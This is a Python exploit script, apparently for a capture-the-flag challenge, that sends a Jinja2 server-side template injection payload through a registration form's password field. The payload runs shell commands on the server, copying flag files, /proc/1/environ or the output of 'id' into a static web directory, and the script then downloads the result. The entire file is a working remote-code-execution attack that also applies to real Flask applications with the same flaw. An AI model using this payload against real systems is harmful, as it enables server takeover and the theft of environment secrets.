
#!/usr/bin/env python3
# Exploit variant using os.system to avoid exceptions (no 500 on register)
# It cd's into likely static dirs and writes fl4g.txt there via shell redirection.

import argparse, requests, secrets, string, sys, time

def randid(n=6):
    return ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def make_payload(filename):
    # Tries to cd into a static dir; then tries several flag locations; falls back to env/id
    sh = (
        'cd /app/app/static 2>/dev/null || '
        'cd /app/static 2>/dev/null || '
        'cd app/static 2>/dev/null || '
        'cd static 2>/dev/null || '
        'exit; '
        '(cat /root/fl4g.txt || cat /flag || cat /proc/1/environ || id) > {fn} 2>/dev/null'
    ).format(fn=filename)
    # Use /bin/sh -lc for predictable behavior
    cmd = f"sh -lc {repr(sh)}"
    return "{{ cycler.__init__.__globals__['os'].system(%s) }}" % repr(cmd)

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--base', required=True, help='Base URL, e.g. http://host:8000')
    ap.add_argument('--verbose', action='store_true')
    ap.add_argument('--timeout', type=float, default=10.0)
    args = ap.parse_args()

    base = args.base.rstrip('/')
    s = requests.Session()

    fname = f"fl4g_{randid()}.txt"
    payload = make_payload(fname)
    username = f"ctf_{randid()}"

    if args.verbose:
        print(f"[+] Registering {username} with os.system payload")

    r = s.post(f"{base}/register", data={'username': username, 'password': payload},
               allow_redirects=True, timeout=args.timeout)
    if args.verbose:
        print(f"[+] Register status: {r.status_code}")

    # Try several static URLs where the file could have landed
    urls = [
        f"{base}/static/{fname}",
        f"{base}/static/js/{fname}",
        f"{base}/static/css/{fname}",
    ]
    for u in urls:
        time.sleep(0.1)
        rr = s.get(u, timeout=args.timeout)
        if args.verbose:
            print(f"[+] GET {u} -> {rr.status_code} ({len(rr.content)} bytes)")
        if rr.status_code == 200 and rr.text.strip():
            print(rr.text.strip())
            return

    print("[-] Not found. Try --verbose; target may differ from provided source.", file=sys.stderr)
    sys.exit(2)

if __name__ == '__main__':
    main()
